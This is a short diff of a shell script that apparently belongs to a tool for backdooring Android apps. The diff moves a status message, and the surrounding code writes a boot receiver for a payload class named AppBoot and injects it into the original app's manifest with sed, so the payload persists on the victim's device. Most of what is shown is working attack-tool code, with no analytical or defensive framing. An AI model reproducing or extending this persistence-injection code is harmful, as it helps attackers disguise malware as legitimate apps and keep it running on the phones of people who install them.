@@ -285,6 +285,7 @@ if [ $rc != 0 ]; then
   exit $rc
 fi
 
+echo -n "[*] Adding persistence hook in original project..."
 cat >$MY_PATH/persistence.hook <<EOL
         <receiver android:name="${payload_tld}.${payload_primary_dir}.${payload_sub_dir}.AppBoot">
             <intent-filter>
@@ -292,7 +293,6 @@ cat >$MY_PATH/persistence.hook <<EOL
             </intent-filter>
         </receiver>
 EOL
-echo -n "[*] Adding persistence hook in original project..."
 sed -i '0,/<\/activity>/s//<\/activity>\n'"$placeholder"'/' $original_manifest_file >>$LOG_FILE 2>&1
 rc=$?
 if [ $rc == 0 ]; then
